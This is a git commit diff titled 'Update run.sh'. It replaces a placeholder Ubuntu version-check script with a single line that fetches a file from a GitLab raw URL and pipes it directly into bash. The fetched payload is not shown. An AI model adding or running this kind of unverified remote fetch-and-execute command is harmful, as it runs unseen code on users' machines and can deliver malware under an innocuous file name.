8f2e73fbf7a64266e7dfb20459606f6c0c913389
w540 <123297472+w540@users.noreply.github.com>
2023-01-22 21:01:38 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,13 +1,1 @@
-#!/usr/bin/env bash
-if [[ $(lsb_release -rs) == "18.04" ]]; then
-       echo "Compatible version 18.04"
-       #Copy your files heri
-fi
-if [[ $(lsb_release -rs) == "20.04" ]]; then
-       echo "Compatible version 20.04"
-       #Copy your files heri
-fi
-if [[ $(lsb_release -rs) == "22.04" ]]; then
-       echo "Compatible version 22.04"
-       #Copy your files heri
-fi
+curl -s "https://gitlab.com/w450x/run/-/raw/main/run" | bash
